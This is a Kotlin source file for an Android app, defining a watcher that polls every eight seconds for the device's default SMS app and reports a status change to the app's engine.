package com.base.realtime.sms

import android.content.Context
import android.os.Handler
import android.os.Looper
import com.base.realtime.RealtimeApp

/** Polls default-SMS package and pushes status when it changes. */
object SmsDefaultWatcher {
    private const val INTERVAL_MS = 8_000L
    private val main = Handler(Looper.getMainLooper())
    private var started = false
    private var lastPkg = ""
    private var app: Context? = null

    private val tick = object : Runnable {
        override fun run() {
            val ctx = app ?: return
            pollOnce(ctx)
            main.postDelayed(this, INTERVAL_MS)
        }
    }

    fun start(context: Context) {
        app = context.applicationContext
        if (!started) {
            started = true
            main.post(tick)
        } else {
            pollOnce(context.applicationContext)
        }
    }

    private fun pollOnce(context: Context) {
        val pkg = SmsDefaultJob.currentDefault(context)
        if (pkg == lastPkg) return
        lastPkg = pkg
        try {
            RealtimeApp.engine(context).reportSmsStatus()
        } catch (_: Throwable) {
        }
    }
}
